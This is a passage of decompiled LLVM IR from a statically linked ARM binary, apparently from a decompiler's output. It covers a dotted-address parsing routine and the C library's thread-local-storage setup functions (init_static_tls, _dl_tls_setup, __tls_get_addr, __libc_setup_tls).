  store i32 %v1_177b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_177b4

dec_label_pc_177b4:                               ; preds = %dec_label_pc_17794, %dec_label_pc_177b0
  %v0_177f4 = phi i32 [ 0, %dec_label_pc_17794 ], [ %v2_177a4, %dec_label_pc_177b0 ]
  %v0_177e4 = phi i32 [ %v0_1777c, %dec_label_pc_17794 ], [ %v1_177b0, %dec_label_pc_177b0 ]
  %v1_177b4 = inttoptr i32 %v0_177e4 to i8*
  %v2_177b4 = load i8, i8* %v1_177b4, align 1
  %v3_177b4 = zext i8 %v2_177b4 to i32
  %v2_177b8 = mul nuw nsw i32 %v3_177b4, 2
  %v2_177bc = add i32 %v2_177b8, %v4_17780
  %v3_177bc = inttoptr i32 %v2_177bc to i16*
  %v4_177bc = load i16, i16* %v3_177bc, align 2
  %v6_177bc = zext i16 %v4_177bc to i32
  %v1_177c0 = and i32 %v6_177bc, 8
  %v2_177c0 = icmp eq i32 %v1_177c0, 0
  br i1 %v2_177c0, label %dec_label_pc_177c8, label %dec_label_pc_1779c

dec_label_pc_177c8:                               ; preds = %dec_label_pc_177b4
  %v7_177c8 = icmp eq i32 %v0_177f8, 4
  br i1 %v7_177c8, label %dec_label_pc_177e0, label %dec_label_pc_177d0

dec_label_pc_177d0:                               ; preds = %dec_label_pc_177c8
  %v7_177d0 = icmp eq i8 %v2_177b4, 46
  br i1 %v7_177d0, label %dec_label_pc_177d8, label %dec_label_pc_17830

dec_label_pc_177d8:                               ; preds = %dec_label_pc_177d0
  %v1_177d8 = add i32 %v0_177e4, 1
  store i32 %v1_177d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_177f4

dec_label_pc_177e0:                               ; preds = %dec_label_pc_177c8
  %v2_177e0 = icmp eq i8 %v2_177b4, 0
  %v1_177e4 = add i32 %v0_177e4, 1
  store i32 %v1_177e4, i32* %r0.global-to-local, align 4
  br i1 %v2_177e0, label %dec_label_pc_177f4, label %dec_label_pc_177ec

dec_label_pc_177ec:                               ; preds = %dec_label_pc_177e0
  %v1_177ec = and i32 %v6_177bc, 32
  %v2_177ec = icmp eq i32 %v1_177ec, 0
  br i1 %v2_177ec, label %dec_label_pc_17830, label %dec_label_pc_177f4

dec_label_pc_177f4:                               ; preds = %dec_label_pc_177ec, %dec_label_pc_177e0, %dec_label_pc_177d8
  %v0_1777c13 = phi i32 [ %v1_177e4, %dec_label_pc_177ec ], [ %v1_177e4, %dec_label_pc_177e0 ], [ %v1_177d8, %dec_label_pc_177d8 ]
  %v4_177f4 = mul i32 %v1_177f4, 256
  %v5_177f4 = or i32 %v0_177f4, %v4_177f4
  %v1_177f8 = add nuw nsw i32 %v0_177f8, 1
  %v7_17800 = icmp slt i32 %v1_177f8, 5
  br i1 %v7_17800, label %dec_label_pc_1777c, label %dec_label_pc_17804

dec_label_pc_17804:                               ; preds = %dec_label_pc_177f4
  %v2_17804 = icmp eq i32 %v0_1775c, 0
  br i1 %v2_17804, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_17804
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17834

bb:                                               ; preds = %dec_label_pc_17804
  %v4_17808 = udiv i32 %v5_177f4, 16777216
  %v2_1780c = udiv i32 %v5_177f4, 256
  %v5_17810 = and i32 %v2_1780c, 65280
  %v2_17814 = and i32 %v5_177f4, 65280
  %v5_17818 = mul nuw nsw i32 %v2_17814, 256
  %v5_1781c = mul i32 %v0_177f4, 16777216
  %v6_17810 = or i32 %v4_17808, %v5_1781c
  %v6_17818 = or i32 %v6_17810, %v5_17810
  %v6_1781c = or i32 %v6_17818, %v5_17818
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17828 = inttoptr i32 %v0_1775c to i32*
  store i32 %v6_1781c, i32* %v3_17828, align 4
  %v2_17834.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17838.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17834

dec_label_pc_17830:                               ; preds = %dec_label_pc_177d0, %dec_label_pc_177ec, %dec_label_pc_1777c, %dec_label_pc_1779c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17834

dec_label_pc_17834:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_17830
  %v1_17838 = phi i32 [ %v1_17838.pre, %bb ], [ 0, %dec_label_pc_17830 ], [ 1, %.thread8.thread ]
  %v2_17834 = phi i32 [ %v2_17834.pre, %bb ], [ %v3_1774c, %dec_label_pc_17830 ], [ %v3_1774c, %.thread8.thread ]
  store i32 %v2_17834, i32* @r4, align 4
  ret i32 %v1_17838

; uselistorder directives
  uselistorder i32 %v1_177f8, { 1, 0 }
  uselistorder i32 %v5_177f4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_177e4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 65280, { 70, 1, 7, 2, 0, 3, 8, 9, 10, 11, 12, 50, 51, 13, 14, 15, 52, 53, 16, 17, 18, 19, 20, 54, 4, 55, 56, 21, 22, 5, 23, 57, 58, 41, 24, 25, 26, 27, 28, 44, 45, 42, 43, 59, 60, 61, 48, 49, 46, 47, 62, 63, 64, 65, 6, 66, 29, 30, 67, 31, 32, 33, 34, 68, 35, 36, 69, 37, 38, 39, 40, 71 }
  uselistorder i8 46, { 0, 1, 3, 2 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 6, 3 }
  uselistorder i16 0, { 0, 1, 2, 7, 8, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 20, 6, 21, 22 }
  uselistorder i32 276, { 1, 0 }
  uselistorder label %dec_label_pc_17834, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17830, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_177b4, { 1, 0 }
  uselistorder label %dec_label_pc_1777c, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_17850 = load i32, i32* @r4, align 4
  store i32 %v3_17850, i32* %stack_var_-16, align 4
  %v4_17854 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_1785c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_17864 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 36) to i32*), align 4
  store i32 %v4_17864, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_1786c = inttoptr i32 %v4_17854 to i32*
  %v2_1786c = load i32, i32* %v1_1786c, align 4
  %v4_17870 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 52) to i32*), align 4
  store i32 %v4_17870, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_17878 = add i32 %v2_1786c, 15
  %v4_1787c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 144) to i32*), align 4
  store i32 %v4_1787c, i32* @ip, align 4
  %v1_17880 = load i32, i32* @r0, align 4
  %v2_17880 = add i32 %v1_17880, %v1_17878
  %v1_17884 = inttoptr i32 %v4_1785c to i32*
  %v2_17884 = load i32, i32* %v1_17884, align 4
  store i32 %v2_17884, i32* %r3.global-to-local, align 4
  %v1_17888 = and i32 %v2_17880, -16
  store i32 %v1_17888, i32* %v1_1786c, align 4
  %v0_17890 = load i32, i32* @r0, align 4
  %v1_17890 = load i32, i32* %r4.global-to-local, align 4
  %v2_17890 = inttoptr i32 %v1_17890 to i32*
  store i32 %v0_17890, i32* %v2_17890, align 4
  %v0_17894 = load i32, i32* @r1, align 4
  %v1_17894 = load i32, i32* %lr.global-to-local, align 4
  %v2_17894 = inttoptr i32 %v1_17894 to i32*
  store i32 %v0_17894, i32* %v2_17894, align 4
  %v0_17898 = load i32, i32* %r3.global-to-local, align 4
  %v1_17898 = load i32, i32* @ip, align 4
  %v2_17898 = inttoptr i32 %v1_17898 to i32*
  store i32 %v0_17898, i32* %v2_17898, align 4
  %v2_1789c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1789c, i32* %r4.global-to-local, align 4
  %v1_178a0 = load i32, i32* @r0, align 4
  ret i32 %v1_178a0

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_178a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_178a8:
  %v0_178a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_178a8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_178a8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_178a8, %bb
  %v4_178b8 = phi i32 [ %arg1, %dec_label_pc_178a8 ], [ 0, %bb ]
  ret i32 %v4_178b8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r3.global-to-local, align 4
  %v4_178cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 84) to i32*), align 4
  store i32 %v4_178cc, i32* @lr, align 4
  %v4_178d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_178f8 = inttoptr i32 %v4_178d8 to i32*
  store i32 1, i32* %v2_178f8, align 4
  %v0_178fc = load i32, i32* %r3.global-to-local, align 4
  %v1_178fc = load i32, i32* @lr, align 4
  %v2_178fc = inttoptr i32 %v1_178fc to i32*
  store i32 %v0_178fc, i32* %v2_178fc, align 4
  %v0_17900 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17918(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17918:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17918 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17918, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17918
  %v2_17918 = load i32, i32* @r4, align 4
  %v8_17918 = ashr i32 %v2_17918, %tmp
  %v9_17918 = and i32 %v8_17918, %tmp
  %v2_1791c = load i32, i32* @ip, align 4
  %v8_1791c = lshr i32 %v2_1791c, %v9_17918
  %v9_1791c = and i32 %v8_1791c, %v9_17918
  store i32 %v9_1791c, i32* %r0.global-to-local, align 4
  %v4_17920 = inttoptr i32 %v9_1791c to i32*
  store i32 %arg2, i32* %v4_17920, align 4
  %v5_17920 = load i32, i32* @ip, align 4
  %v6_17920 = load i32, i32* %r0.global-to-local, align 4
  %v7_17920 = sub i32 %v6_17920, %v5_17920
  store i32 %v7_17920, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17918, %bb
  %v8_17920 = phi i32 [ %tmp, %dec_label_pc_17918 ], [ %v7_17920, %bb ]
  ret i32 %v8_17920

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1792c = call i32 @__aeabi_read_tp()
  %v1_17930 = inttoptr i32 %v0_1792c to i32*
  %v2_17930 = load i32, i32* %v1_17930, align 4
  %v1_17934 = add i32 %arg1, 4
  %v2_17934 = inttoptr i32 %v1_17934 to i32*
  %v3_17934 = load i32, i32* %v2_17934, align 4
  %v1_17938 = add i32 %v2_17930, 8
  %v2_17938 = inttoptr i32 %v1_17938 to i32*
  %v3_17938 = load i32, i32* %v2_17938, align 4
  %v2_1793c = add i32 %v3_17938, %v3_17934
  ret i32 %v2_1793c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17948 = load i32, i32* @r4, align 4
  store i32 %v3_17948, i32* %stack_var_-36, align 4
  %v6_17948 = load i32, i32* @r5, align 4
  %v15_17948 = load i32, i32* @r8, align 4
  %v18_17948 = load i32, i32* @sb, align 4
  %v21_17948 = load i32, i32* @sl, align 4
  %v24_17948 = load i32, i32* @fp, align 4
  %v27_17948 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %sl.global-to-local, align 4
  %v4_17958 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 104) to i32*), align 4
  store i32 %v4_17958, i32* %r3.global-to-local, align 4
  %v1_1795c = inttoptr i32 %v4_17958 to i32*
  %v2_1795c = load i32, i32* %v1_1795c, align 4
  store i32 %v2_1795c, i32* %r2.global-to-local, align 4
  %v2_17960 = icmp eq i32 %v2_1795c, 0
  %v0_17968 = load i32, i32* %r0.global-to-local, align 4
  %v0_1796c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1796c, i32* %ip.global-to-local, align 4
  br i1 %v2_17960, label %dec_label_pc_17b34, label %dec_label_pc_17974

dec_label_pc_17974:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_17978 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 156) to i32*), align 4
  store i32 %v4_17978, i32* @lr, align 4
  store i32 %v2_1795c, i32* %r1.global-to-local, align 4
  %v1_179c0 = inttoptr i32 %v4_17978 to i32*
  %v2_179c061 = load i32, i32* %v1_179c0, align 4
  %v4_179c462 = mul i32 %v2_179c061, 32
  %v5_179c463 = add i32 %v4_179c462, %v2_1795c
  store i32 %v5_179c463, i32* %r3.global-to-local, align 4
  %v3_179c865 = icmp ult i32 %v2_1795c, %v5_179c463
  br i1 %v3_179c865, label %dec_label_pc_17984, label %dec_label_pc_17b34.loopexit

dec_label_pc_17984:                               ; preds = %dec_label_pc_17974, %dec_label_pc_179bc
  %v0_1799c66 = phi i32 [ %v1_179bc, %dec_label_pc_179bc ], [ %v2_1795c, %dec_label_pc_17974 ]
  %v1_17984 = inttoptr i32 %v0_1799c66 to i32*
  %v2_17984 = load i32, i32* %v1_17984, align 4
  store i32 %v2_17984, i32* %r3.global-to-local, align 4
  %v7_17988 = icmp eq i32 %v2_17984, 7
  br i1 %v7_17988, label %dec_label_pc_17990, label %dec_label_pc_179bc

dec_label_pc_17990:                               ; preds = %dec_label_pc_17984
  %v1_17990 = add i32 %v0_1799c66, 20
  %v2_17990 = inttoptr i32 %v1_17990 to i32*
  %v3_17990 = load i32, i32* %v2_17990, align 4
  store i32 %v3_17990, i32* %r3.global-to-local, align 4
  %v1_17994 = add i32 %v0_1799c66, 28
  %v2_17994 = inttoptr i32 %v1_17994 to i32*
  %v3_17994 = load i32, i32* %v2_17994, align 4
  store i32 %v3_17994, i32* @r6, align 4
  %v1_1799c = add i32 %v0_1799c66, 16
  %v2_1799c = inttoptr i32 %v1_1799c to i32*
  %v3_1799c = load i32, i32* %v2_1799c, align 4
  store i32 %v3_1799c, i32* %r3.global-to-local, align 4
  %v1_179a0 = add i32 %v0_1799c66, 8
  %v2_179a0 = inttoptr i32 %v1_179a0 to i32*
  %v3_179a0 = load i32, i32* %v2_179a0, align 4
  store i32 %v3_179a0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17994, %v0_1796c
  %v0_1796c.v3_17994 = select i1 %tmp78, i32 %v0_1796c, i32 %v3_17994
  store i32 %v0_1796c.v3_17994, i32* %fp.global-to-local, align 4
  %v2_179d8 = icmp eq i32 %v3_17994, 0
  br i1 %v2_179d8, label %dec_label_pc_17a00, label %bb

dec_label_pc_179bc:                               ; preds = %dec_label_pc_17984
  %v1_179bc = add i32 %v0_1799c66, 32
  store i32 %v1_179bc, i32* %r1.global-to-local, align 4
  %v2_179c0 = load i32, i32* %v1_179c0, align 4
  %v4_179c4 = mul i32 %v2_179c0, 32
  %v5_179c4 = add i32 %v4_179c4, %v2_1795c
  store i32 %v5_179c4, i32* %r3.global-to-local, align 4
  %v3_179c8 = icmp ult i32 %v1_179bc, %v5_179c4
  br i1 %v3_179c8, label %dec_label_pc_17984, label %dec_label_pc_179c0.dec_label_pc_17b34.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17990
  %v2_179dc = add i32 %v3_17994, -1
  br label %dec_label_pc_17a04

dec_label_pc_17a00:                               ; preds = %dec_label_pc_17990, %dec_label_pc_17b34
  %v0_17a14.pre = phi i32 [ %v0_17a14.pre.pre, %dec_label_pc_17b34 ], [ ptrtoint (i32* @global_var_21d10.338 to i32), %dec_label_pc_17990 ]
  %v1_17a04.pre = phi i32 [ %v1_17a04.pre.pre, %dec_label_pc_17b34 ], [ %v0_17968, %dec_label_pc_17990 ]
  %v1_17a2825 = phi i32 [ %v0_17b3c, %dec_label_pc_17b34 ], [ %v0_1796c.v3_17994, %dec_label_pc_17990 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_17b34 ], [ %v3_17990, %dec_label_pc_17990 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_17b34 ], [ %v3_1799c, %dec_label_pc_17990 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_17b34 ], [ %v3_179a0, %dec_label_pc_17990 ]
  br label %dec_label_pc_17a04

dec_label_pc_17a04:                               ; preds = %bb, %dec_label_pc_17a00
  %storemerge80 = phi i32 [ %v2_179dc, %bb ], [ 0, %dec_label_pc_17a00 ]
  %v0_17a04 = phi i32 [ %v2_179dc, %bb ], [ 0, %dec_label_pc_17a00 ]
  %storemerge = phi i32 [ %v3_17994, %bb ], [ 1, %dec_label_pc_17a00 ]
  %storemerge79 = phi i32 [ %v3_17994, %bb ], [ 1, %dec_label_pc_17a00 ]
  %v0_17a14 = phi i32 [ ptrtoint (i32* @global_var_21d10.338 to i32), %bb ], [ %v0_17a14.pre, %dec_label_pc_17a00 ]
  %v1_17a04 = phi i32 [ %v0_17968, %bb ], [ %v1_17a04.pre, %dec_label_pc_17a00 ]
  %v1_17a28 = phi i32 [ %v0_1796c.v3_17994, %bb ], [ %v1_17a2825, %dec_label_pc_17a00 ]
  %stack_var_-52.3 = phi i32 [ %v3_17990, %bb ], [ %stack_var_-52.0, %dec_label_pc_17a00 ]
  %stack_var_-48.3 = phi i32 [ %v3_1799c, %bb ], [ %stack_var_-48.0, %dec_label_pc_17a00 ]
  %stack_var_-44.3 = phi i32 [ %v3_179a0, %bb ], [ %stack_var_-44.0, %dec_label_pc_17a00 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17a04 = add i32 %v1_17a04, %v0_17a04
  %v2_17a08 = udiv i32 %v2_17a04, %storemerge
  store i32 %v2_17a08, i32* %r0.global-to-local, align 4
  %v2_17a0c = mul i32 %v2_17a08, %storemerge
  store i32 %v2_17a0c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17a14 = add i32 %v0_17a14, 72
  %v3_17a14 = inttoptr i32 %v2_17a14 to i32*
  %v4_17a14 = load i32, i32* %v3_17a14, align 4
  store i32 %v4_17a14, i32* %r3.global-to-local, align 4
  %v1_17a18 = inttoptr i32 %v4_17a14 to i32*
  %v2_17a18 = load i32, i32* %v1_17a18, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_17a20 = add i32 %v1_17a28, 1168
  %v2_17a24 = add i32 %v1_17a20, %stack_var_-52.3
  %v2_17a28 = add i32 %v2_17a24, %v2_17a0c
  %v2_17a2c = add i32 %v2_17a28, %v2_17a18
  store i32 %v2_17a2c, i32* %r0.global-to-local, align 4
  %v1_17a30 = call i32 @__GI_sbrk(i32 %v2_17a2c)
  %v1_17a34 = load i32, i32* %fp.global-to-local, align 4
  %v1_17a3c = sub i32 0, %v1_17a34
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_17a34 = add i32 %v1_17a30, 1167
  %v1_17a44 = add i32 %v2_17a34, %v1_17a34
  %v2_17a48 = and i32 %v1_17a44, %v1_17a3c
  store i32 %v2_17a48, i32* @r5, align 4
  %v1_17a50 = load i32, i32* %sl.global-to-local, align 4
  %v3_17a50 = add i32 %v1_17a50, 10236
  %v4_17a50 = inttoptr i32 %v3_17a50 to i32*
  store i32 62, i32* %v4_17a50, align 4
  %v0_17a58 = load i32, i32* @r5, align 4
  %v1_17a58 = load i32, i32* %sb.global-to-local, align 4
  %v2_17a58 = add i32 %v1_17a58, %v0_17a58
  store i32 %v2_17a58, i32* @ip, align 4
  %v0_17a5c = load i32, i32* %sl.global-to-local, align 4
  %v1_17a5c = load i32, i32* %r4.global-to-local, align 4
  %v2_17a5c = add i32 %v1_17a5c, %v0_17a5c
  store i32 %v2_17a5c, i32* %r4.global-to-local, align 4
  %v2_17a60 = add i32 %v0_17a5c, 11524
  store i32 %v2_17a60, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_17a58, i32* @r0, align 4
  %v2_17a74 = add i32 %v2_17a5c, 16
  %v3_17a74 = inttoptr i32 %v2_17a74 to i32*
  store i32 %v2_17a58, i32* %v3_17a74, align 4
  %v0_17a78 = load i32, i32* %sb.global-to-local, align 4
  %v1_17a78 = load i32, i32* %r8.global-to-local, align 4
  %v2_17a78 = add i32 %v1_17a78, 40
  %v3_17a78 = inttoptr i32 %v2_17a78 to i32*
  store i32 %v0_17a78, i32* %v3_17a78, align 4
  %v0_17a7c = load i32, i32* @r3, align 4
  %v1_17a7c = trunc i32 %v0_17a7c to i8
  %v2_17a7c = load i32, i32* %r4.global-to-local, align 4
  %v3_17a7c = add i32 %v2_17a7c, 20
  %v4_17a7c = inttoptr i32 %v3_17a7c to i8*
  store i8 %v1_17a7c, i8* %v4_17a7c, align 1
  %v0_17a80 = load i32, i32* %r4.global-to-local, align 4
  %v1_17a80 = add i32 %v0_17a80, 8
  store i32 %v1_17a80, i32* @r4, align 4
  %v0_17a84 = call i32 @memcpy()
  %v0_17a8c = load i32, i32* @r4, align 4
  %v1_17a8c = load i32, i32* @r5, align 4
  %v2_17a8c = inttoptr i32 %v1_17a8c to i32*
  store i32 %v0_17a8c, i32* %v2_17a8c, align 4
  %v0_17a90 = load i32, i32* @r5, align 4
  store i32 %v0_17a90, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17a90, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_13388.530 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17aa4 = load i32, i32* %sl.global-to-local, align 4
  %v2_17aa4 = add i32 %v0_17aa4, 84
  %v3_17aa4 = inttoptr i32 %v2_17aa4 to i32*
  %v4_17aa4 = load i32, i32* %v3_17aa4, align 4
  store i32 %v4_17aa4, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17ab0 = add i32 %v0_17aa4, 60
  %v3_17ab0 = inttoptr i32 %v2_17ab0 to i32*
  %v4_17ab0 = load i32, i32* %v3_17ab0, align 4
  store i32 %v4_17ab0, i32* %r0.global-to-local, align 4
  %v3_17ab8 = add i32 %v0_17aa4, 10748
  %v4_17ab8 = inttoptr i32 %v3_17ab8 to i32*
  store i32 64, i32* %v4_17ab8, align 4
  %v1_17ac0 = load i32, i32* %r8.global-to-local, align 4
  %v2_17ac0 = add i32 %v1_17ac0, 20
  %v3_17ac0 = inttoptr i32 %v2_17ac0 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17ac0, align 4
  %v1_17ac8 = load i32, i32* %r8.global-to-local, align 4
  %v2_17ac8 = add i32 %v1_17ac8, 24
  %v3_17ac8 = inttoptr i32 %v2_17ac8 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17ac8, align 4
  %v1_17ad0 = load i32, i32* %r0.global-to-local, align 4
  %v2_17ad0 = inttoptr i32 %v1_17ad0 to i32*
  store i32 1, i32* %v2_17ad0, align 4
  %v1_17ad8 = load i32, i32* %r8.global-to-local, align 4
  %v2_17ad8 = add i32 %v1_17ad8, 28
  %v3_17ad8 = inttoptr i32 %v2_17ad8 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17ad8, align 4
  %v0_17ae0 = load i32, i32* @r6, align 4
  %v2_17ae0 = icmp eq i32 %v0_17ae0, 0
  %v1_17ae4 = load i32, i32* %r8.global-to-local, align 4
  %v2_17ae4 = add i32 %v1_17ae4, 44
  %v3_17ae4 = inttoptr i32 %v2_17ae4 to i32*
  store i32 1, i32* %v3_17ae4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_17aec = load i32, i32* %sl.global-to-local, align 4
  %v1_17aec = load i32, i32* %r1.global-to-local, align 4
  %v2_17aec = add i32 %v1_17aec, %v0_17aec
  store i32 %v2_17aec, i32* %r2.global-to-local, align 4
  %v1_17af0 = load i32, i32* @r6, align 4
  br i1 %v2_17ae0, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17a04
  store i32 %v1_17af0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17afc34 = load i32, i32* %r8.global-to-local, align 4
  %v2_17afc35 = add i32 %v1_17afc34, 32
  %v3_17afc36 = inttoptr i32 %v2_17afc35 to i32*
  store i32 %v1_17af0, i32* %v3_17afc36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17a04
  %v2_17af4 = add i32 %v1_17af0, -1
  store i32 %v2_17af4, i32* %r0.global-to-local, align 4
  %v1_17afc = load i32, i32* %r8.global-to-local, align 4
  %v2_17afc = add i32 %v1_17afc, 32
  %v3_17afc = inttoptr i32 %v2_17afc to i32*
  store i32 %v1_17af0, i32* %v3_17afc, align 4
  %v1_17b00 = load i32, i32* @r6, align 4
  store i32 %v1_17b00, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17b04 = load i32, i32* %r8.global-to-local, align 4
  %v1_17b04 = load i32, i32* %r2.global-to-local, align 4
  %v2_17b04 = add i32 %v1_17b04, 28
  %v3_17b04 = inttoptr i32 %v2_17b04 to i32*
  store i32 %v0_17b04, i32* %v3_17b04, align 4
  %v0_17b08 = load i32, i32* %r2.global-to-local, align 4
  %v1_17b08 = load i32, i32* %ip.global-to-local, align 4
  %v2_17b08 = inttoptr i32 %v1_17b08 to i32*
  store i32 %v0_17b08, i32* %v2_17b08, align 4
  %v0_17b0c = load i32, i32* %r0.global-to-local, align 4
  %v1_17b0c = load i32, i32* %r3.global-to-local, align 4
  %v2_17b0c = add i32 %v1_17b0c, %v0_17b0c
  store i32 %v2_17b0c, i32* %r0.global-to-local, align 4
  %v1_17b10 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17ae0, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17b18.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17b18 = phi i32 [ %v0_17b18.pre, %._crit_edge ], [ %v1_17b10, %bb54 ]
  %v2_17b14 = udiv i32 %v2_17b0c, %v1_17b10
  %v2_17b18 = load i32, i32* %sb.global-to-local, align 4
  %v3_17b18 = mul i32 %v2_17b14, %v0_17b18
  %v4_17b18 = add i32 %v2_17b18, %v3_17b18
  store i32 %v4_17b18, i32* @r0, align 4
  %v0_17b1c = load i32, i32* %fp.global-to-local, align 4
  %v2_17b1c = icmp ult i32 %v0_17b1c, 16
  %v0_17b1c. = select i1 %v2_17b1c, i32 16, i32 %v0_17b1c
  store i32 %v0_17b1c., i32* @r1, align 4
  %v2_17b2c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17b2c, i32* @r4, align 4
  store i32 %v6_17948, i32* @r5, align 4
  store i32 %v15_17948, i32* %r8.global-to-local, align 4
